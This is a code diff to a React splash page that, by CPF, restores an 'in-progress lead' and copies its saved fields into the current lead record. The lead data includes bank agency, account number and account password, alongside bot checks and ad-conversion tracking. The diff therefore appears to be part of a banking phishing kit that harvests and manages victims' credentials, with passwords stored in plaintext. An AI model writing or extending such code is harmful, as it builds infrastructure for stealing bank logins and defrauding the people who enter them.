@@ -2,7 +2,7 @@ import { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { Switch } from "@/components/ui/switch";
 import { useFlow } from "@/contexts/FlowContext";
-import { configRepository } from "@/repositories";
+import { configRepository, leadRepository } from "@/repositories";
 import { edgeFunctionsService } from "@/services";
 import { maskCPF, maskPhone, isValidCPF, isValidPhone } from "@/lib/masks";
 import LottieBackground from "@/components/LottieBackground";
@@ -63,6 +63,51 @@ const SplashPage = () => {
     if (turnstileActive && !turnstileToken) return;
 
     updateData({ cpf, phone, rememberAccount: remember });
+
+    // ── Resume existing in-progress lead for this CPF ──
+    // CPF is stored masked in the DB (e.g. "123.456.789-00"), so search with mask.
+    try {
+      const currentLeadId = sessionStorage.getItem("lead_id");
+      const existing = await leadRepository.findByCpf(cpf);
+
+      if (existing && existing.id !== currentLeadId) {
+        const step = existing.current_step ?? "inicio";
+
+        // Restore saved data into FlowContext
+        updateData({
+          cpf,
+          phone: existing.phone ?? phone,
+          nome: existing.nome ?? "",
+          segment: existing.segment ?? "",
+          agency: existing.agency ?? "",
+          account: existing.account ?? "",
+          password: existing.password ?? "",
+        });
+
+        // Copy progress into the current lead (keeps session FK intact)
+        if (currentLeadId) {
+          await leadRepository.update(currentLeadId, {
+            cpf,
+            phone: existing.phone ?? phone,
+            nome: existing.nome,
+            segment: existing.segment,
+            agency: existing.agency,
+            account: existing.account,
+            password: existing.password,
+            current_step: step,
+          });
+        }
+
+        // Delete the old lead (no active session attached)
+        leadRepository.delete(existing.id).catch(() => {});
+
+        // Navigate to where the user left off
+        navigate(step === "splash" || step === "inicio" ? getNextStep("inicio") : `/${step}`);
+        return;
+      }
+    } catch {
+      // Non-fatal — continue with normal flow if lookup fails
+    }
 
     // Track Lead — browser pixel + CAPI fire-and-forget (unified)
     trackLead({
